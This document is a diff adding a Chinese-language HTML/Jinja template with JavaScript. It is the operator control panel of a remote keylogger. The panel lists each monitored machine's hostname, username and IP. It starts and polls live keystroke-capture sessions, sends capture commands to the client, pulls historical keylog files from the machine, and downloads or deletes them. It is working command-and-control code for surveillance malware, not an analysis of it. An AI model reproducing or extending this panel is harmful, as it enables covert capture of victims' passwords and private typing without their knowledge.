@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>键盘记录 - {{ client_info.get('hostname', '未知主机') }}</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            background-color: #f8f9fa;
+        }
+        
+        h1 {
+            color: #212529;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+        
+        .keylog-container {
+            font-family: monospace;
+            max-height: 400px;
+            overflow-y: auto;
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+        }
+        
+        .keylog-entry {
+            margin-bottom: 2px;
+        }
+        
+        .timestamp {
+            color: #666;
+            margin-right: 10px;
+        }
+        
+        .key {
+            font-weight: bold;
+            color: #0d6efd;
+        }
+        
+        .special-key {
+            color: #dc3545;
+            font-weight: bold;
+        }
+        
+        /* 实时键盘记录样式 */
+        .realtime-container {
+            height: 300px;
+            overflow-y: auto;
+            background-color: #000;
+            color: #20c20e;
+            font-family: 'Courier New', monospace;
+            padding: 10px;
+            border-radius: 4px;
+        }
+        
+        .realtime-key {
+            margin: 2px 0;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .realtime-key .timestamp {
+            color: #888;
+        }
+        
+        .realtime-key .key-content {
+            color: #20c20e;
+            font-weight: bold;
+        }
+        
+        .realtime-key .special {
+            color: #ff6b6b;
+        }
+        
+        /* 美化卡片样式 */
+        .card {
+            box-shadow: 0 0.125rem 0.25rem rgba(0, 0, 0, 0.075);
+            border: 1px solid rgba(0, 0, 0, 0.125);
+            transition: box-shadow 0.3s ease;
+        }
+        
+        .card:hover {
+            box-shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.15);
+        }
+        
+        .card-header {
+            background-color: rgba(0, 0, 0, 0.03);
+            border-bottom: 1px solid rgba(0, 0, 0, 0.125);
+            font-weight: 500;
+        }
+        
+        /* 美化按钮 */
+        .btn-outline-primary {
+            border-color: #0d6efd;
+            color: #0d6efd;
+        }
+        
+        .btn-outline-primary:hover {
+            background-color: #0d6efd;
+            color: white;
+        }
+        
+        .btn-outline-secondary {
+            border-color: #6c757d;
+            color: #6c757d;
+        }
+        
+        .btn-outline-secondary:hover {
+            background-color: #6c757d;
+            color: white;
+        }
+        
+        /* 美化表格 */
+        .table {
+            margin-bottom: 0;
+        }
+        
+        .table th {
+            background-color: rgba(0, 0, 0, 0.03);
+            border-bottom: 1px solid #dee2e6;
+            width: 30%;
+        }
+        
+        /* 美化手风琴 */
+        .accordion-button:not(.collapsed) {
+            background-color: rgba(13, 110, 253, 0.1);
+            color: #0d6efd;
+        }
+        
+        .accordion-button:focus {
+            box-shadow: 0 0 0 0.25rem rgba(13, 110, 253, 0.25);
+        }
+        
+        /* 添加模式切换标签 */
+        .nav-tabs .nav-link {
+            color: #495057;
+            border: 1px solid transparent;
+            border-top-left-radius: .25rem;
+            border-top-right-radius: .25rem;
+            margin-right: 2px;
+        }
+        
+        .nav-tabs .nav-link.active {
+            color: #0d6efd;
+            background-color: #fff;
+            border-color: #dee2e6 #dee2e6 #fff;
+        }
+        
+        .tab-content {
+            border: 1px solid #dee2e6;
+            border-top: none;
+            padding: 15px;
+            background-color: #fff;
+            border-bottom-left-radius: 4px;
+            border-bottom-right-radius: 4px;
+        }
+        
+        .session-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        
+        .session-active {
+            background-color: #28a745;
+            animation: pulse 2s infinite;
+        }
+        
+        .session-inactive {
+            background-color: #dc3545;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container mt-4">
+        <div class="d-flex justify-content-between align-items-center mb-4">
+            <h1>键盘记录 - {{ client_info.get('hostname', '未知主机') }}</h1>
+            <div>
+                <a href="/client/{{ client_id }}" class="btn btn-outline-secondary me-2">
+                    <i class="bi bi-display"></i> 返回客户端
+                </a>
+                <a href="/" class="btn btn-outline-secondary">
+                    <i class="bi bi-arrow-left"></i> 返回列表
+                </a>
+            </div>
+        </div>
+        
+        <div class="row">
+            <div class="col-md-3 mb-4">
+                <div class="card">
+                    <div class="card-header">
+                        客户端信息
+                    </div>
+                    <div class="card-body">
+                        <p><strong>主机名:</strong> {{ client_info.get('hostname', '未知') }}</p>
+                        <p><strong>用户名:</strong> {{ client_info.get('username', '未知') }}</p>
+                        <p><strong>IP地址:</strong> {{ client_info.get('ip', '未知') }}</p>
+                        <p><strong>最后活动:</strong> {{ client_info.get('last_seen', '未知') }}</p>
+                        <p><strong>客户端ID:</strong> <span class="text-truncate d-inline-block" style="max-width: 100%;">{{ client_id }}</span></p>
+                    </div>
+                    <div class="card-footer">
+                        <a href="/client/{{ client_id }}" class="btn btn-primary w-100">
+                            <i class="bi bi-display"></i> 返回客户端详情
+                        </a>
+                    </div>
+                </div>
+                
+                <!-- 控制面板 -->
+                <div class="card mt-3">
+                    <div class="card-header">
+                        控制面板
+                    </div>
+                    <div class="card-body">
+                        <div class="form-check form-switch mb-3">
+                            <input class="form-check-input" type="checkbox" id="realtime-autoScroll" checked>
+                            <label class="form-check-label" for="realtime-autoScroll">自动滚动</label>
+                        </div>
+                        <div class="d-grid gap-2">
+                            <button class="btn btn-outline-primary" id="clearRealtimeBtn">
+                                <i class="bi bi-trash"></i> 清空实时显示
+                            </button>
+                            <button class="btn btn-outline-success" id="sendRealtimeCmd">
+                                <i class="bi bi-send"></i> 发送实时键盘记录命令
+                            </button>
+                            <button class="btn btn-outline-info" id="uploadKeylogFiles">
+                                <i class="bi bi-upload"></i> 上传历史键盘记录
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-9">
+                <!-- 添加标签导航 -->
+                <ul class="nav nav-tabs" id="keylogTabs" role="tablist">
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link active" id="realtime-tab" data-bs-toggle="tab" data-bs-target="#realtime" type="button" role="tab" aria-controls="realtime" aria-selected="true">
+                            <i class="bi bi-keyboard"></i> 实时键盘记录
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link" id="history-tab" data-bs-toggle="tab" data-bs-target="#history" type="button" role="tab" aria-controls="history" aria-selected="false">
+                            <i class="bi bi-clock-history"></i> 历史键盘记录
+                        </button>
+                    </li>
+                </ul>
+                
+                <div class="tab-content" id="keylogTabsContent">
+                    <!-- 实时键盘记录 -->
+                    <div class="tab-pane fade show active" id="realtime" role="tabpanel" aria-labelledby="realtime-tab">
+                        <div class="mb-3">
+                            <div class="d-flex justify-content-between align-items-center mb-2">
+                                <h5>实时键盘记录</h5>
+                                <div>
+                                    <span class="session-indicator" id="session-indicator"></span>
+                                    <span class="badge" id="session-status">停止</span>
+                                </div>
+                            </div>
+                            <div class="realtime-container" id="realtime-keylog">
+                                <div class="text-center text-muted p-3">
+                                    <i class="bi bi-keyboard"></i> 等待键盘输入...
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- 历史键盘记录 -->
+                    <div class="tab-pane fade" id="history" role="tabpanel" aria-labelledby="history-tab">
+                        <div class="d-flex justify-content-between align-items-center mb-3">
+                            <h5>历史键盘记录</h5>
+                            <button class="btn btn-sm btn-outline-primary" onclick="location.reload()">
+                                <i class="bi bi-arrow-clockwise"></i> 刷新
+                            </button>
+                        </div>
+                        
+                        {% if keylog_files %}
+                        <div class="accordion" id="keylogAccordion">
+                            {% for keylog_file in keylog_files %}
+                            <div class="accordion-item">
+                                <h2 class="accordion-header" id="heading{{ loop.index }}">
+                                    <button class="accordion-button {% if not loop.first %}collapsed{% endif %}" type="button" data-bs-toggle="collapse" data-bs-target="#collapse{{ loop.index }}" aria-expanded="{{ 'true' if loop.first else 'false' }}" aria-controls="collapse{{ loop.index }}">
+                                        {{ keylog_file.replace('keylog_', '').replace('.txt', '') }}
+                                    </button>
+                                </h2>
+                                <div id="collapse{{ loop.index }}" class="accordion-collapse collapse {% if loop.first %}show{% endif %}" aria-labelledby="heading{{ loop.index }}" data-bs-parent="#keylogAccordion">
+                                    <div class="accordion-body">
+                                        <div class="mb-2">
+                                            <a href="/uploads/{{ client_id }}/{{ keylog_file }}" class="btn btn-sm btn-outline-primary" download>
+                                                <i class="bi bi-download"></i> 下载
+                                            </a>
+                                            <button class="btn btn-sm btn-outline-danger delete-keylog-btn" data-filename="{{ keylog_file }}">
+                                                <i class="bi bi-trash"></i> 删除
+                                            </button>
+                                        </div>
+                                        <div class="keylog-container">
+                                            {% if keylog_contents[keylog_file] %}
+                                                {% for line in keylog_contents[keylog_file].split('\n') %}
+                                                    {% set parts = line.split(': ', 1) %}
+                                                    {% if parts|length > 1 %}
+                                                        <div class="keylog-entry">
+                                                            <span class="timestamp">{{ parts[0] }}</span>
+                                                            {% if 'Key.' in parts[1] %}
+                                                                <span class="special-key">{{ parts[1] }}</span>
+                                                            {% else %}
+                                                                <span class="key">{{ parts[1] }}</span>
+                                                            {% endif %}
+                                                        </div>
+                                                    {% else %}
+                                                        <div class="keylog-entry">{{ line }}</div>
+                                                    {% endif %}
+                                                {% endfor %}
+                                            {% else %}
+                                                <div class="alert alert-warning">无法读取键盘记录内容</div>
+                                            {% endif %}
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            {% endfor %}
+                        </div>
+                        {% else %}
+                        <div class="alert alert-info">
+                            <i class="bi bi-info-circle"></i> 暂无历史键盘记录文件
+                        </div>
+                        {% endif %}
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // 定义全局变量
+        const clientId = "{{ client_id }}";
+        
+        // 实时键盘记录管理
+        class RealtimeKeylogManager {
+            constructor() {
+                this.realtimeContainer = document.getElementById('realtime-keylog');
+                this.sessionIndicator = document.getElementById('session-indicator');
+                this.sessionStatus = document.getElementById('session-status');
+                this.autoScroll = document.getElementById('realtime-autoScroll');
+                this.clearBtn = document.getElementById('clearRealtimeBtn');
+                
+                this.isActive = false;
+                this.sessionActive = false;
+                this.pollInterval = null;
+                this.refreshInterval = null;
+                
+                this.bindEvents();
+            }
+            
+            bindEvents() {
+                // 绑定清空按钮
+                this.clearBtn.addEventListener('click', () => this.clearDisplay());
+                
+                // 监听标签页切换
+                document.getElementById('realtime-tab').addEventListener('shown.bs.tab', () => {
+                    this.start();
+                });
+                
+                document.getElementById('history-tab').addEventListener('shown.bs.tab', () => {
+                    this.stop();
+                });
+                
+                // 页面关闭时停止
+                window.addEventListener('beforeunload', () => this.stop());
+            }
+            
+            async start() {
+                if (this.isActive) return;
+                
+                try {
+                    // 启动实时会话
+                    const response = await fetch(`/api/keylog_realtime/${clientId}/start`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' }
+                    });
+                    
+                    const data = await response.json();
+                    if (data.status === 'success') {
+                        this.isActive = true;
+                        this.sessionActive = true;
+                        this.updateStatus('active', '实时会话已启动');
+                        
+                        // 开始轮询数据
+                        this.startPolling();
+                        
+                        // 开始定期刷新会话 (8秒刷新)
+                        this.startRefresh();
+                        
+                        console.log('实时键盘记录会话已启动');
+                    } else {
+                        console.error('启动实时会话失败:', data.message);
+                        this.updateStatus('error', '启动失败');
+                    }
+                } catch (error) {
+                    console.error('启动实时键盘记录失败:', error);
+                    this.updateStatus('error', '连接错误');
+                }
+            }
+            
+            async stop() {
+                if (!this.isActive) return;
+                
+                try {
+                    // 停止轮询和刷新
+                    this.stopPolling();
+                    this.stopRefresh();
+                    
+                    // 停止实时会话
+                    await fetch(`/api/keylog_realtime/${clientId}/stop`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' }
+                    });
+                    
+                    this.isActive = false;
+                    this.sessionActive = false;
+                    this.updateStatus('inactive', '已停止');
+                    
+                    console.log('实时键盘记录会话已停止');
+                } catch (error) {
+                    console.error('停止实时键盘记录失败:', error);
+                }
+            }
+            
+            startPolling() {
+                // 每秒获取数据
+                this.pollInterval = setInterval(() => {
+                    this.pollData();
+                }, 1000);
+            }
+            
+            stopPolling() {
+                if (this.pollInterval) {
+                    clearInterval(this.pollInterval);
+                    this.pollInterval = null;
+                }
+            }
+            
+            startRefresh() {
+                // 每8秒刷新会话
+                this.refreshInterval = setInterval(() => {
+                    this.refreshSession();
+                }, 8000);
+            }
+            
+            stopRefresh() {
+                if (this.refreshInterval) {
+                    clearInterval(this.refreshInterval);
+                    this.refreshInterval = null;
+                }
+            }
+            
+            async refreshSession() {
+                if (!this.isActive) return;
+                
+                try {
+                    const response = await fetch(`/api/keylog_realtime/${clientId}/refresh`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' }
+                    });
+                    
+                    const data = await response.json();
+                    if (data.status !== 'success') {
+                        console.warn('刷新会话失败:', data.message);
+                        // 会话可能已过期，尝试重新启动
+                        this.isActive = false;
+                        this.start();
+                    }
+                } catch (error) {
+                    console.error('刷新会话错误:', error);
+                }
+            }
+            
+            async pollData() {
+                if (!this.isActive) return;
+                
+                try {
+                    const response = await fetch(`/api/keylog_realtime_data/${clientId}?_t=${Date.now()}`);
+                    const data = await response.json();
+                    
+                    if (data.status === 'success' && data.keylog_data && data.keylog_data.length > 0) {
+                        data.keylog_data.forEach(keyData => {
+                            this.addKeylogEntry(keyData);
+                        });
+                    }
+                } catch (error) {
+                    console.error('获取实时数据失败:', error);
+                }
+            }
+            
+            addKeylogEntry(keyData) {
+                // 移除"等待键盘输入..."提示
+                if (this.realtimeContainer.querySelector('.text-muted')) {
+                    this.realtimeContainer.innerHTML = '';
+                }
+                
+                // 创建条目元素
+                const entry = document.createElement('div');
+                entry.className = 'realtime-key';
+                
+                // 解析键盘记录
+                const parts = keyData.split(': ');
+                if (parts.length > 1) {
+                    const timestamp = parts[0];
+                    const keyContent = parts[1];
+                    
+                    const timestampSpan = document.createElement('span');
+                    timestampSpan.className = 'timestamp';
+                    timestampSpan.textContent = timestamp;
+                    
+                    const keySpan = document.createElement('span');
+                    keySpan.className = keyContent.includes('Key.') ? 'key-content special' : 'key-content';
+                    keySpan.textContent = keyContent;
+                    
+                    entry.appendChild(timestampSpan);
+                    entry.appendChild(document.createTextNode(' '));
+                    entry.appendChild(keySpan);
+                } else {
+                    entry.textContent = keyData;
+                }
+                
+                // 添加到容器
+                this.realtimeContainer.appendChild(entry);
+                
+                // 如果开启自动滚动，则滚动到底部
+                if (this.autoScroll.checked) {
+                    this.realtimeContainer.scrollTop = this.realtimeContainer.scrollHeight;
+                }
+                
+                // 限制显示条数
+                const maxEntries = 500;
+                while (this.realtimeContainer.children.length > maxEntries) {
+                    this.realtimeContainer.removeChild(this.realtimeContainer.firstChild);
+                }
+            }
+            
+            clearDisplay() {
+                this.realtimeContainer.innerHTML = '<div class="text-center text-muted p-3"><i class="bi bi-keyboard"></i> 等待键盘输入...</div>';
+            }
+            
+            updateStatus(status, message) {
+                const indicator = this.sessionIndicator;
+                const statusElement = this.sessionStatus;
+                
+                // 移除所有状态类
+                indicator.classList.remove('session-active', 'session-inactive');
+                statusElement.classList.remove('bg-success', 'bg-danger', 'bg-warning', 'bg-secondary');
+                
+                switch (status) {
+                    case 'active':
+                        indicator.classList.add('session-active');
+                        statusElement.classList.add('bg-success');
+                        break;
+                    case 'inactive':
+                        indicator.classList.add('session-inactive');
+                        statusElement.classList.add('bg-secondary');
+                        break;
+                    case 'error':
+                        indicator.classList.add('session-inactive');
+                        statusElement.classList.add('bg-danger');
+                        break;
+                }
+                
+                statusElement.textContent = message;
+            }
+        }
+        
+        // 页面加载完成后初始化
+        document.addEventListener('DOMContentLoaded', function() {
+            const realtimeManager = new RealtimeKeylogManager();
+            
+            // 如果默认在实时标签页，自动开始
+            if (document.getElementById('realtime-tab').classList.contains('active')) {
+                realtimeManager.start();
+            }
+            
+            // 发送实时键盘记录命令按钮
+            document.getElementById('sendRealtimeCmd').addEventListener('click', function() {
+                this.disabled = true;
+                this.innerHTML = '<i class="bi bi-hourglass-split"></i> 发送中...';
+                
+                fetch(`/api/send_realtime_keylog/${clientId}`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ duration: 5 })  // 获取5秒内的按键
+                })
+                .then(response => response.json())
+                .then(data => {
+                    showAlert(data.status === 'success' ? 'success' : 'danger', 
+                             data.message || '操作完成');
+                })
+                .catch(error => {
+                    showAlert('danger', '发送命令失败: ' + error.message);
+                })
+                .finally(() => {
+                    this.disabled = false;
+                    this.innerHTML = '<i class="bi bi-send"></i> 发送实时键盘记录命令';
+                });
+            });
+            
+            // 上传历史键盘记录按钮
+            document.getElementById('uploadKeylogFiles').addEventListener('click', function() {
+                this.disabled = true;
+                this.innerHTML = '<i class="bi bi-hourglass-split"></i> 上传中...';
+                
+                fetch(`/api/keylog_upload/${clientId}`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ upload_type: 'recent', max_files: 10 })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    showAlert(data.status === 'success' ? 'success' : 'danger', 
+                             data.message || '操作完成');
+                    if (data.status === 'success') {
+                        // 5秒后刷新页面以显示新上传的文件
+                        setTimeout(() => location.reload(), 2000);
+                    }
+                })
+                .catch(error => {
+                    showAlert('danger', '上传命令失败: ' + error.message);
+                })
+                .finally(() => {
+                    this.disabled = false;
+                    this.innerHTML = '<i class="bi bi-upload"></i> 上传历史键盘记录';
+                });
+            });
+        });
+        
+        // 显示提示信息
+        function showAlert(type, message) {
+            const alert = document.createElement('div');
+            alert.className = `alert alert-${type} alert-dismissible fade show`;
+            alert.innerHTML = `
+                <strong>${type === 'success' ? '成功!' : '错误!'}</strong> ${message}
+                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+            `;
+            document.querySelector('.tab-content').prepend(alert);
+            
+            // 自动关闭提示
+            setTimeout(() => {
+                const bsAlert = new bootstrap.Alert(alert);
+                bsAlert.close();
+            }, 3000);
+        }
+        
+        // 删除键盘记录确认对话框
+        const deleteDialog = document.createElement('div');
+        deleteDialog.className = 'modal fade';
+        deleteDialog.id = 'deleteKeylogConfirm';
+        deleteDialog.innerHTML = `
+            <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5 class="modal-title">确认删除</h5>
+                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                    </div>
+                    <div class="modal-body">
+                        <p>确定要删除此键盘记录文件吗？此操作无法撤销。</p>
+                        <p class="text-danger" id="deleteFileName"></p>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>
+                        <button type="button" class="btn btn-danger" id="confirmDelete">删除</button>
+                    </div>
+                </div>
+            </div>
+        `;
+        document.body.appendChild(deleteDialog);
+        
+        // 处理删除按钮点击事件
+        document.addEventListener('click', function(e) {
+            if (e.target.closest('.delete-keylog-btn')) {
+                const btn = e.target.closest('.delete-keylog-btn');
+                const filename = btn.dataset.filename;
+                const deleteModal = new bootstrap.Modal(document.getElementById('deleteKeylogConfirm'));
+                document.getElementById('deleteFileName').textContent = filename;
+                
+                // 设置确认按钮事件
+                document.getElementById('confirmDelete').onclick = function() {
+                    deleteKeylogFile(filename, btn);
+                    deleteModal.hide();
+                };
+                
+                deleteModal.show();
+            }
+        });
+        
+        // 删除键盘记录文件
+        function deleteKeylogFile(filename, btnElement) {
+            fetch(`/api/delete_keylog/${clientId}/${filename}`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    // 删除成功，移除对应的accordion项
+                    const accordionItem = btnElement.closest('.accordion-item');
+                    accordionItem.remove();
+                    
+                    // 显示成功提示
+                    const alert = document.createElement('div');
+                    alert.className = 'alert alert-success alert-dismissible fade show';
+                    alert.innerHTML = `
+                        <strong>成功!</strong> ${data.message}
+                        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+                    `;
+                    document.querySelector('.tab-content').prepend(alert);
+                    
+                    // 自动关闭提示
+                    setTimeout(() => {
+                        const bsAlert = new bootstrap.Alert(alert);
+                        bsAlert.close();
+                    }, 3000);
+                } else {
+                    // 显示错误提示
+                    const alert = document.createElement('div');
+                    alert.className = 'alert alert-danger alert-dismissible fade show';
+                    alert.innerHTML = `
+                        <strong>错误!</strong> ${data.message}
+                        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+                    `;
+                    document.querySelector('.tab-content').prepend(alert);
+                }
+            })
+            .catch(error => {
+                console.error('删除键盘记录文件出错:', error);
+                // 显示错误提示
+                const alert = document.createElement('div');
+                alert.className = 'alert alert-danger alert-dismissible fade show';
+                alert.innerHTML = `
+                    <strong>错误!</strong> 删除文件时发生错误
+                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+                `;
+                document.querySelector('.tab-content').prepend(alert);
+            });
+        }
+    </script>
+</body>
+</html> 
